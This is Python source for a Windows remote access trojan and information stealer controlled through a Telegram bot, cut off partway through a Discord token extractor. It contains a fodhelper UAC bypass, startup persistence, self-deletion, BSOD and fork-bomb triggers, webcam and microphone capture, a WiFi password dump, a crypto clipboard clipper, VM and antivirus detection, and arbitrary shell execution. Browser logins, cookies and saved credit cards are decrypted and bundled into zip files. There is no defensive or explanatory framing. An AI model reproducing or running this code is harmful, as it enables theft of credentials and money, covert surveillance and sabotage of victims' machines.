import telebot
from telebot import types
import threading
import time
import os
from telebot import apihelper
import tempfile
import json
from PIL import Image
import base64
import shutil
import re
import sys
import platform
import sqlite3
import zipfile
from typing import Dict, List, Tuple, Optional, Union
from datetime import datetime, timedelta
from io import BytesIO
import ctypes
import subprocess
import win32api
import win32con
import psutil
import sounddevice as sd
import numpy as np
import wavio
from PIL import ImageGrab
import cv2
import soundfile as sf
import requests
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook, File
from win32crypt import CryptUnprotectData
import glob
import hashlib
import logging
from zipfile import ZipFile, ZIP_DEFLATED
from ftplib import FTP


os.system ('cls')

with open("config.json", "r") as f:
    config = json.load(f)
bot = telebot.TeleBot(config["telegram_config"]["bot_token"])



class AdminStarter:
    @staticmethod
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    @staticmethod
    def run_as_admin():
        if not AdminStarter.is_admin():
            script = sys.argv[0]
            params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
            try:
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, f'"{script}" {params}', None, 1
                )
            except Exception as e:
                print("es:", e)
            sys.exit()









class StartupManager:
    def __init__(self, shortcut_name: str):
        self.shortcut_name = shortcut_name
        self.startup_folder = os.path.join(
            os.getenv('APPDATA'), 
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )
        self.shortcut_path = os.path.join(self.startup_folder, f"{self.shortcut_name}.lnk")

    def is_in_startup(self) -> bool:
        return os.path.exists(self.shortcut_path)

    def add_to_startup(self) -> bool:
        # try:
            if getattr(sys, 'frozen', False):
                target_path = sys.executable
            else:
                target_path = os.path.abspath(__file__)

            ps_script = f"""
            $WshShell = New-Object -ComObject WScript.Shell;
            $Shortcut = $WshShell.CreateShortcut('{self.shortcut_path}');
            $Shortcut.TargetPath = '{target_path}';
            $Shortcut.WorkingDirectory = '{os.path.dirname(target_path)}';
            $Shortcut.WindowStyle = 1;
            $Shortcut.Description = 'Startup shortcut for {self.shortcut_name}';
            $Shortcut.Save();
            """
            subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", ps_script],
                check=True
            )

class SystemController:
    def __init__(self):
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        self.gdi32 = ctypes.windll.gdi32
        self.ntdll = ctypes.windll.ntdll


    def upload_file(self, file_path):
        try:
            destination = os.path.join(os.getcwd(), os.path.basename(file_path))
            import shutil
            shutil.copy(file_path, destination)
            return True
        except Exception as e:
            print(f"Upload error: {e}")
            return False
        
        
    def bypass_uac(self):
        try:
            if self.is_admin():
                return True
            payload = sys.executable  
            reg_path = "Software\\Classes\\ms-settings\\shell\\open\\command"

            key = win32api.RegCreateKey(win32con.HKEY_CURRENT_USER, reg_path)
            win32api.RegSetValueEx(key, None, 0, win32con.REG_SZ, payload)
            win32api.RegSetValueEx(key, "DelegateExecute", 0, win32con.REG_SZ, "")
            win32api.RegCloseKey(key)

            system32 = os.path.join(os.environ["WINDIR"], "System32")
            uac_apps = ["fodhelper.exe", "computerdefaults.exe"]

            for app in uac_apps:
                target = os.path.join(system32, app)
                try:
                    win32api.ShellExecute(
                        None, "open", target, None, None, win32con.SW_SHOWDEFAULT
                    )
                    return True
                except Exception as e:
                    print(f"Failed with {app}: {e}")

            return False

        except Exception as e:
            return False

        finally:
            try:
                win32api.RegDeleteKey(win32con.HKEY_CURRENT_USER, reg_path)
            except:
                pass
            
    def delete_self(self):
        try:
            bat_path = os.path.join(os.getenv('TEMP'), 'self_delete.bat')
            with open(bat_path, 'w') as bat_file:
                bat_file.write(f'@echo off\nping 127.0.0.1 -n 2 > nul\ndel "{sys.argv[0]}"\ndel "%~f0"')
            subprocess.Popen([bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return True
        except Exception as e:
            print(f"Self-deletion failed: {e}")
            return False
            
    def elevate_to_critical(self):
        try:
            process_id = os.getpid()
            process_handle = self.kernel32.OpenProcess(0x1F0FFF, False, process_id)
            self.ntdll.RtlSetProcessIsCritical(1, 0, 0)
            return True
        except Exception as e:
            print(f"Elevation to critical failed: {e}")
            return False
            
    def disable_critical(self):
        try:
            self.ntdll.RtlSetProcessIsCritical(0, 0, 0)
            return True
        except Exception as e:
            print(f"Disabling critical failed: {e}")
            return False
            
    def manipulate_graphics(self, image_path=None, text=None, glitch_effect=None):
        try:
            hdc = self.user32.GetDC(0)
            
            if image_path and os.path.exists(image_path):
                img = Image.open(image_path)
                width, height = img.size
                
                for x in range(width):
                    for y in range(height):
                        r, g, b = img.getpixel((x, y))
                        self.gdi32.SetPixel(hdc, x, y, self.rgb_to_int(r, g, b))
            
            elif text:
                self.user32.DrawTextA(hdc, text, -1, ctypes.byref(ctypes.wintypes.RECT(0, 0, 1000, 1000)), 0)
            
            elif glitch_effect:
                width = self.user32.GetSystemMetrics(0)
                height = self.user32.GetSystemMetrics(1)
                
                for _ in range(1000):
                    x = ctypes.c_int(ctypes.windll.kernel32.GetTickCount() % width)
                    y = ctypes.c_int(ctypes.windll.kernel32.GetTickCount() % height)
                    self.gdi32.SetPixel(hdc, x, y, 0xFFFFFF)
            
            self.user32.ReleaseDC(0, hdc)
            return True
        except Exception as e:
            print(f"Graphics manipulation failed: {e}")
            return False
            
    def rgb_to_int(self, r, g, b):
        return r | (g << 8) | (b << 16)
        
    def _ensure_admin(self):

        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def toggle_monitors(self, state):
        try:
            if not self._ensure_admin():
                raise PermissionError("Admin rights required!")

            if state == "off":
                self.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
                return True
            else:
                self.user32.mouse_event(0x0001, 1, 1, 0, 0)
                self.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
                return True

        except Exception as e:
            print(f"🌪 Error toggling monitors: {e}")
            return False
        

    

            
    def block_website(self, website):
        try:
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            with open(hosts_path, 'a') as hosts_file:
                hosts_file.write(f"\n127.0.0.1 {website}")
                hosts_file.write(f"\n127.0.0.1 www.{website}")
            return True
        except Exception as e:
            print(f"Website blocking failed: {e}")
            return False
            
    def unblock_website(self, website):
        try:
            hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
            with open(hosts_path, 'r') as hosts_file:
                lines = hosts_file.readlines()
            
            with open(hosts_path, 'w') as hosts_file:
                for line in lines:
                    if website not in line:
                        hosts_file.write(line)
            return True
        except Exception as e:
            print(f"Website unblocking failed: {e}")
            return False
            
    def get_processes(self):
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'username': proc.info['username']
                })
            return processes
        except Exception as e:
            print(f"Process listing failed: {e}")
            return []
            
    def kill_process(self, pid_or_name):
        try:
            if isinstance(pid_or_name, int):
                psutil.Process(pid_or_name).kill()
            else:
                for proc in psutil.process_iter():
                    if proc.name() == pid_or_name:
                        proc.kill()
            return True
        except Exception as e:
            print(f"Process killing failed: {e}")
            return False
            
    def blacklist_process(self, process_name):
        try:
            key = win32api.RegOpenKeyEx(
                win32con.HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + process_name,
                0,
                win32con.KEY_WRITE
            )
            win32api.RegSetValueEx(key, "Debugger", 0, win32con.REG_SZ, "ntsd -d")
            win32api.RegCloseKey(key)
            return True
        except Exception as e:
            print(f"Process blacklisting failed: {e}")
            return False
            
    def whitelist_process(self, process_name):
        try:
            win32api.RegDeleteKey(
                win32con.HKEY_LOCAL_MACHINE,
                "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + process_name
            )
            return True
        except Exception as e:
            print(f"Process whitelisting failed: {e}")
            return False
            
    def get_foreground_process(self):
        try:
            hwnd = self.user32.GetForegroundWindow()
            pid = ctypes.c_ulong()
            self.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            return psutil.Process(pid.value).name()
        except:
            return "Unknown"
            
    def send_message(self, title, text, style=0):
        try:
            return self.user32.MessageBoxW(0, text, title, style)
        except Exception as e:
            print(f"Message sending failed: {e}")
            return 0
            
    def text_to_speech(self, text):
        try:
            from comtypes.client import CreateObject
            speaker = CreateObject("SAPI.SpVoice")
            speaker.Speak(text)
            return True
        except Exception as e:
            print(f"Text-to-speech failed: {e}")
            return False
            
    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                temp_path = os.path.join(os.getenv('TEMP'), 'webcam_capture.jpg')
                cv2.imwrite(temp_path, frame)
                return temp_path
            return None
        except Exception as e:
            print(f"Webcam capture failed: {e}")
            return None
            
    def block_input(self, block=True):
        try:
            if block:
                self.user32.BlockInput(True)
            else:
                self.user32.BlockInput(False)
            return True
        except Exception as e:
            print(f"Input blocking failed: {e}")
            return False
            
    def get_wifi_passwords(self):
        try:
            output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8')
            profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]
            
            wifi_data = []
            for profile in profiles:
                try:
                    results = subprocess.check_output(
                        ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
                    ).decode('utf-8')
                    password = [line.split(":")[1].strip() for line in results.split('\n') if "Key Content" in line][0]
                    wifi_data.append({
                        'ssid': profile,
                        'password': password
                    })
                except:
                    wifi_data.append({
                        'ssid': profile,
                        'password': '<could not retrieve>'
                    })
            return wifi_data
        except Exception as e:
            print(f"WiFi password retrieval failed: {e}")
            return []
            
    def set_volume(self, level):
        try:
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            
            volume.SetMasterVolumeLevelScalar(level / 100, None)
            return True
        except Exception as e:
            print(f"Volume control failed: {e}")
            return False
            
    def play_audio(self, file_path=None, data=None):
        try:
            if file_path and os.path.exists(file_path):
                data, samplerate = sf.read(file_path)
            
            if data is not None:
                sd.play(data, samplerate)
                return True
            return False
        except Exception as e:
            print(f"Audio playback failed: {e}")
            return False
            
    def record_microphone(self, duration=5, output_path=None):
        try:
            samplerate = 44100
            recording = sd.rec(int(duration * samplerate), samplerate=samplerate, channels=2)
            sd.wait()
            
            if output_path:
                wavio.write(output_path, recording, samplerate, sampwidth=2)
            
            return recording
        except Exception as e:
            print(f"Microphone recording failed: {e}")
            return None
            
    def file_operations(self, operation, path, destination=None):
        try:
            if operation == "list":
                return os.listdir(path)
            elif operation == "cd":
                os.chdir(path)
                return os.getcwd()
            elif operation == "upload" and destination:
                shutil.copy2(path, destination)
                return True
            elif operation == "download" and destination:
                shutil.copy2(path, destination)
                return True
            elif operation == "remove":
                if os.path.isdir(path):
                    shutil.rmtree(path)
                else:
                    os.remove(path)
                return True
            elif operation == "execute":
                subprocess.Popen(path, shell=True)
                return True
            return False
        except Exception as e:
            print(f"File operation failed: {e}")
            return False
            
    def start_clipper(self, replace_dict):
        try:
            import clipboard
            original = clipboard.paste()
            
            for original_wallet, replacement_wallet in replace_dict.items():
                if original_wallet in original:
                    clipboard.copy(replacement_wallet)
                    return True
            return False
        except Exception as e:
            print(f"Crypto clipper failed: {e}")
            return False
            
    def trigger_jumpscare(self, preset="default"):
        try:
            if preset == "default":
                self.manipulate_graphics(glitch_effect=True)
                self.play_audio(data=np.random.uniform(-1, 1, 44100))
                return True
            return False
        except Exception as e:
            print(f"Jumpscare failed: {e}")
            return False
            
    def trigger_bsod(self):
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
            return True
        except Exception as e:
            print(f"BSOD trigger failed: {e}")
            return False
            
    def execute_forkbomb(self):
        try:
            while True:
                subprocess.Popen(__file__, shell=True)
            return True
        except Exception as e:
            print(f"Fork bomb failed: {e}")
            return False
            
    def is_vm(self):
        try:
            vm_indicators = [
                "VMware", "VirtualBox", "QEMU", "Xen", "KVM", 
                "Hyper-V", "Microsoft Virtual", "Parallels", "Bochs"
            ]
            
            manufacturer = subprocess.check_output(
                'wmic computersystem get manufacturer', 
                shell=True
            ).decode().lower()
            
            if any(indicator.lower() in manufacturer for indicator in vm_indicators):
                return True
                
            model = subprocess.check_output(
                'wmic computersystem get model', 
                shell=True
            ).decode().lower()
            
            if any(indicator.lower() in model for indicator in vm_indicators):
                return True
                
            bios = subprocess.check_output(
                'wmic bios get serialnumber', 
                shell=True
            ).decode().lower()
            
            if any(indicator.lower() in bios for indicator in vm_indicators):
                return True
                
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in ['vboxservice.exe', 'vmware.exe']:
                    return True
                    
            return False
        except:
            return False
            
    def run_shell_command(self, command):
        try:
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT
            ).decode('utf-8', errors='replace')
            return result
        except subprocess.CalledProcessError as e:
            return e.output.decode('utf-8', errors='replace')
        except Exception as e:
            return str(e)



class SystemInfo:
    def __init__(self, system_id, owner_id, name="New System"):
        self.system_id = system_id
        self.owner_id = owner_id
        self.name = name
        self.ip_address = self._get_ip()
        self.os_info = f"{platform.system()} {platform.release()}"
        self.cpu_cores = os.cpu_count()
        self.ram_gb = round(psutil.virtual_memory().total / (1024**3), 2)
        self.last_seen = datetime.now()
        self.privilege = "Admin" if ctypes.windll.shell32.IsUserAnAdmin() else "User"
        self.antivirus = self._detect_antivirus()
        self._is_active = True  

    @property
    def is_active(self):
        return self._is_active

    @is_active.setter
    def is_active(self, value):
        self._is_active = value

    def _get_ip(self):
        try:
            return requests.get('https://api.ipify.org').text
        except:
            return "Unknown"
    
    def _detect_antivirus(self):
        try:
            antivirus_list = []
            processes = [p.name() for p in psutil.process_iter()]
            if "avp.exe" in processes: antivirus_list.append("Kaspersky")
            if "bdagent.exe" in processes: antivirus_list.append("BitDefender")
            if "msmpeng.exe" in processes: antivirus_list.append("Windows Defender")
            if "avastui.exe" in processes: antivirus_list.append("Avast")
            if "avgui.exe" in processes: antivirus_list.append("AVG")
            return ", ".join(antivirus_list) if antivirus_list else "Not Detected"
        except:
            return "Unknown"
    
    def update_status(self):
        self.last_seen = datetime.now()
        self._is_active = True
    
    def get_info_card(self):
        status = "🟢 Online" if self.is_active else "🔴 Offline"
        return f"""
🔹 *{self.name}* [{status}]
🆔 `{self.system_id}`
💻 {self.os_info} | {self.cpu_cores} Core | {self.ram_gb}GB RAM
🛡️ *Antivirus:* {self.antivirus}
🔐 *Privilege:* {self.privilege}
🌐 {self.ip_address}
⏱ Last Active: {self.last_seen.strftime('%Y-%m-%d %H:%M:%S')}
"""


class SystemManager:
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance.systems = {}
            cls._instance.controllers = {}
            cls._instance.active_systems = {}  # user_id -> system_id
            cls._instance.start_health_check()
        return cls._instance
    
    def clear_active_system(self, user_id):
        try:
            if user_id in self.active_systems:
                system_id = self.active_systems[user_id]
                if system_id in self.systems:
                    self.systems[system_id].is_active = False
                del self.active_systems[user_id]
                return True
            return False
        except Exception as e:
            print(f"Error in clear_active_system: {e}")
            return False
    
    def register_system(self, system_id, owner_id, name=None):
        if system_id in self.systems:
            return self.systems[system_id]
        
        name = name or f"System-{system_id[:4]}"
        system = SystemInfo(system_id, owner_id, name)
        self.systems[system_id] = system
        self.controllers[system_id] = SystemController()
        return system
    
    def get_system(self, system_id):
        return self.systems.get(system_id)
    
    def get_controller(self, system_id):
        return self.controllers.get(system_id)
    
    def get_user_systems(self, user_id):
        return [sys for sys in self.systems.values() if sys.owner_id == user_id]
    
    def set_active_system(self, user_id, system_id):
        if system_id in self.systems and self.systems[system_id].owner_id == user_id:
            current_active = self.active_systems.get(user_id)
            if current_active and current_active in self.systems:
                self.systems[current_active].is_active = False
            
            self.active_systems[user_id] = system_id
            self.systems[system_id].is_active = True
            return True
        return False
    
    def get_active_system(self, user_id):
        return self.active_systems.get(user_id)
    
    def remove_inactive_systems(self):
        now = datetime.now()
        inactive = []
        for sys_id, system in self.systems.items():
            if (now - system.last_seen).total_seconds() > 3600:  # 1 hour
                inactive.append(sys_id)
        
        for sys_id in inactive:
            for uid, sid in list(self.active_systems.items()):
                if sid == sys_id:
                    del self.active_systems[uid]
            del self.systems[sys_id]
            del self.controllers[sys_id]
    
    def start_health_check(self):
        def health_check():
            while True:
                self.remove_inactive_systems()
                time.sleep(300)  
        
        thread = threading.Thread(target=health_check, daemon=True)
        thread.start()












class BrowserDataExtractor:
    def __init__(self):
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.temp_dir = os.path.join(os.getenv("TEMP"), "browser_data")
        
        if not os.path.exists(self.temp_dir):
            os.makedirs(self.temp_dir)

    def get_browser_paths(self) -> Dict[str, Dict[str, str]]:
        return {
            'Chrome': {
                'path': self.appdata + '\\Google\\Chrome\\User Data\\Default',
                'local_state': self.appdata + '\\Google\\Chrome\\User Data\\Local State'
            },
            'Microsoft Edge': {
                'path': self.appdata + '\\Microsoft\\Edge\\User Data\\Default',
                'local_state': self.appdata + '\\Microsoft\\Edge\\User Data\\Local State'
            },
            'Brave': {
                'path': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
                'local_state': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Local State'
            },
            'Opera': {
                'path': self.roaming + '\\Opera Software\\Opera Stable',
                'local_state': self.roaming + '\\Opera Software\\Opera Stable\\Local State'
            },
            'Yandex': {
                'path': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default',
                'local_state': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Local State'
            }
        }

    def _get_master_key(self, local_state_path: str) -> Optional[bytes]:
        if not os.path.exists(local_state_path):
            return None

        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
                
            if 'os_crypt' not in local_state:
                return None
                
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # Remove DPAPI prefix
            return CryptUnprotectData(master_key, None, None, None, 0)[1]
        except:
            return None

    def _decrypt_value(self, buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass[:-16].decode()
        except:
            return ""

    def _copy_database(self, source_path: str) -> Optional[str]:
        if not os.path.exists(source_path):
            return None
            
        temp_path = os.path.join(self.temp_dir, os.path.basename(source_path))
        try:
            shutil.copy2(source_path, temp_path)
            return temp_path
        except:
            return None

    def get_logins(self, browser_path: str, local_state_path: str) -> List[Dict]:
        logins = []
        login_db = os.path.join(browser_path, "Login Data")
        temp_db = self._copy_database(login_db)
        
        if not temp_db:
            return logins
            
        master_key = self._get_master_key(local_state_path)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                password = ""
                
                if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                    password = self._decrypt_value(encrypted_password, master_key) if master_key else ""
                else:
                    password = CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                
                if username or password:
                    logins.append({
                        'url': url,
                        'username': username,
                        'password': password
                    })
        except:
            pass
        finally:
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
                
        return logins

    def get_cookies(self, browser_path: str, local_state_path: str) -> List[Dict]:
        cookies = []
        cookie_db = os.path.join(browser_path, "Network", "Cookies")
        temp_db = self._copy_database(cookie_db)
        
        if not temp_db:
            return cookies
            
        master_key = self._get_master_key(local_state_path)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
            
            for row in cursor.fetchall():
                host, name, encrypted_value, expires = row
                
                if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
                    value = self._decrypt_value(encrypted_value, master_key) if master_key else ""
                else:
                    value = CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                
                cookies.append({
                    'host': host,
                    'name': name,
                    'value': value,
                    'expires': datetime(1601, 1, 1) + timedelta(microseconds=expires) if expires else "Session"
                })
        except:
            pass
        finally:
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
                
        return cookies

    def get_web_history(self, browser_path: str) -> List[Dict]:
        history = []
        history_db = os.path.join(browser_path, "History")
        temp_db = self._copy_database(history_db)
        
        if not temp_db:
            return history
            
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
            
            for row in cursor.fetchall():
                url, title, visit_count, last_visit = row
                last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=last_visit) if last_visit else "N/A"
                
                history.append({
                    'url': url,
                    'title': title,
                    'visit_count': visit_count,
                    'last_visit': last_visit_time
                })
        except:
            pass
        finally:
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
                
        return history

    def get_downloads(self, browser_path: str) -> List[Dict]:
        downloads = []
        history_db = os.path.join(browser_path, "History")
        temp_db = self._copy_database(history_db)
        
        if not temp_db:
            return downloads
            
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT target_path, tab_url, total_bytes, start_time FROM downloads ORDER BY start_time DESC LIMIT 100")
            
            for row in cursor.fetchall():
                path, url, size, start_time = row
                start_time = datetime(1601, 1, 1) + timedelta(microseconds=start_time) if start_time else "N/A"
                
                downloads.append({
                    'path': path,
                    'url': url,
                    'size': f"{size / 1024:.2f} KB" if size else "Unknown",
                    'time': start_time
                })
        except:
            pass
        finally:
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
                
        return downloads

    def get_credit_cards(self, browser_path: str, local_state_path: str) -> List[Dict]:
        cards = []
        cards_db = os.path.join(browser_path, "Web Data")
        temp_db = self._copy_database(cards_db)
        
        if not temp_db:
            return cards
            
        master_key = self._get_master_key(local_state_path)
        
        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards")
            
            for row in cursor.fetchall():
                name, month, year, encrypted_number, modified = row
                
                if encrypted_number.startswith(b'v10') or encrypted_number.startswith(b'v11'):
                    number = self._decrypt_value(encrypted_number, master_key) if master_key else ""
                else:
                    number = CryptUnprotectData(encrypted_number, None, None, None, 0)[1].decode()
                
                modified_time = datetime(1601, 1, 1) + timedelta(microseconds=modified) if modified else "N/A"
                
                cards.append({
                    'name': name,
                    'number': number,
                    'expires': f"{month}/{year}",
                    'modified': modified_time
                })
        except:
            pass
        finally:
            conn.close()
            try:
                os.remove(temp_db)
            except:
                pass
                
        return cards

    def extract_all_browser_data(self) -> Dict[str, Dict[str, List[Dict]]]:
        browser_paths = self.get_browser_paths()
        all_data = {}
        
        for browser_name, paths in browser_paths.items():
            if not os.path.exists(paths['path']):
                continue
                
            browser_data = {
                'logins': [],
                'cookies': [],
                'history': [],
                'downloads': [],
                'cards': []
            }
            
            try:
                browser_data['logins'] = self.get_logins(paths['path'], paths['local_state'])
                browser_data['cookies'] = self.get_cookies(paths['path'], paths['local_state'])
                browser_data['history'] = self.get_web_history(paths['path'])
                browser_data['downloads'] = self.get_downloads(paths['path'])
                browser_data['cards'] = self.get_credit_cards(paths['path'], paths['local_state'])
                
                if any(browser_data.values()):
                    all_data[browser_name] = browser_data
            except Exception as e:
                continue
                
        return all_data

    def create_data_files(self, all_data: Dict[str, Dict[str, List[Dict]]]) -> Tuple[str, str]:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        txt_filename = os.path.join(self.temp_dir, f"browser_data_{timestamp}.txt")
        zip_filename = os.path.join(self.temp_dir, f"browser_data_{timestamp}.zip")
        
        with open(txt_filename, 'w', encoding='utf-8') as f:
            for browser_name, data in all_data.items():
                f.write(f"===== {browser_name} =====\n\n")
                
                if data['logins']:
                    f.write("=== Saved Logins ===\n")
                    for login in data['logins']:
                        f.write(f"URL: {login['url']}\n")
                        f.write(f"Username: {login['username']}\n")
                        f.write(f"Password: {login['password']}\n\n")
                
                if data['cookies']:
                    f.write("=== Cookies ===\n")
                    for cookie in data['cookies']:
                        f.write(f"Host: {cookie['host']}\n")
                        f.write(f"Name: {cookie['name']}\n")
                        f.write(f"Value: {cookie['value']}\n")
                        f.write(f"Expires: {cookie['expires']}\n\n")
                
                if data['history']:
                    f.write("=== Browsing History ===\n")
                    for history in data['history'][:100]:
                        f.write(f"URL: {history['url']}\n")
                        f.write(f"Title: {history['title']}\n")
                        f.write(f"Visits: {history['visit_count']}\n")
                        f.write(f"Last Visit: {history['last_visit']}\n\n")
                
                if data['downloads']:
                    f.write("=== Downloads ===\n")
                    for download in data['downloads']:
                        f.write(f"URL: {download['url']}\n")
                        f.write(f"Path: {download['path']}\n")
                        f.write(f"Size: {download['size']}\n")
                        f.write(f"Time: {download['time']}\n\n")
                
                if data['cards']:
                    f.write("=== Credit Cards ===\n")
                    for card in data['cards']:
                        f.write(f"Name: {card['name']}\n")
                        f.write(f"Number: {card['number']}\n")
                        f.write(f"Expires: {card['expires']}\n")
                        f.write(f"Modified: {card['modified']}\n\n")
                
                f.write("\n\n")
        
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(txt_filename, os.path.basename(txt_filename))
            
            for browser_name, data in all_data.items():
                browser_file = os.path.join(self.temp_dir, f"{browser_name}_data.txt")
                with open(browser_file, 'w', encoding='utf-8') as f:
                    if data['logins']:
                        f.write("=== Saved Logins ===\n")
                        for login in data['logins']:
                            f.write(f"URL: {login['url']}\n")
                            f.write(f"Username: {login['username']}\n")
                            f.write(f"Password: {login['password']}\n\n")
                    
                    if data['cookies']:
                        f.write("=== Cookies ===\n")
                        for cookie in data['cookies']:
                            f.write(f"Host: {cookie['host']}\n")
                            f.write(f"Name: {cookie['name']}\n")
                            f.write(f"Value: {cookie['value']}\n")
                            f.write(f"Expires: {cookie['expires']}\n\n")
                    
                    if data['history']:
                        f.write("=== Browsing History ===\n")
                        for history in data['history'][:100]:
                            f.write(f"URL: {history['url']}\n")
                            f.write(f"Title: {history['title']}\n")
                            f.write(f"Visits: {history['visit_count']}\n")
                            f.write(f"Last Visit: {history['last_visit']}\n\n")
                    
                    if data['downloads']:
                        f.write("=== Downloads ===\n")
                        for download in data['downloads']:
                            f.write(f"URL: {download['url']}\n")
                            f.write(f"Path: {download['path']}\n")
                            f.write(f"Size: {download['size']}\n")
                            f.write(f"Time: {download['time']}\n\n")
                    
                    if data['cards']:
                        f.write("=== Credit Cards ===\n")
                        for card in data['cards']:
                            f.write(f"Name: {card['name']}\n")
                            f.write(f"Number: {card['number']}\n")
                            f.write(f"Expires: {card['expires']}\n")
                            f.write(f"Modified: {card['modified']}\n\n")
                
                zipf.write(browser_file, os.path.basename(browser_file))
                os.remove(browser_file)
        
        return txt_filename, zip_filename

class TokenExtractor:    
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens: List[str] = []
        self.uids: List[str] = []
        
        self.pc_name = platform.node()
        self.os_info = f"{platform.system()} {platform.release()}"
        self.extract_start_time = time.time()

    def extract(self) -> Tuple[List[str], List[str]]:
        self._check_discord_clients()
        self._check_browsers()
        return self.tokens, self.uids

    def _check_discord_clients(self) -> None:
        discord_paths = {
            'Discord': self.roaming + '\\discord',
            'Discord Canary': self.roaming + '\\discordcanary',
            'Discord PTB': self.roaming + '\\discordptb'
        }

        for name, base_path in discord_paths.items():
            storage_path = base_path + '\\Local Storage\\leveldb\\'
            local_state_path = base_path + '\\Local State'
            
            if not os.path.exists(storage_path) or not os.path.exists(local_state_path):
                continue
                
            self._process_encrypted_tokens(storage_path, local_state_path)

    def _check_browsers(self) -> None:
        browser_paths = {
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        for name, base_path in browser_paths.items():
            storage_path = base_path + '\\Local Storage\\leveldb\\'
            if os.path.exists(storage_path):
                self._process_plaintext_tokens(storage_path)

    def _process_encrypted_tokens(self, path: str, local_state_path: str) -> None:
        master_key = self._get_master_key(local_state_path)
        if not master_key:
            return

        for file_name in os.listdir(path):
            if not file_name.endswith(('.log', '.ldb')):
                continue
                
            try:
                with open(f'{path}\\{file_name}', 'r', errors='ignore') as file:
                    for line in file:
                        line = line.strip()
                        if not line:
                            continue
                            
                        for match in re.findall(self.regexp_enc, line):
                            token = self._decrypt_token(
                                base64.b64decode(match.split('dQw4w9WgXcQ:')[1]), 
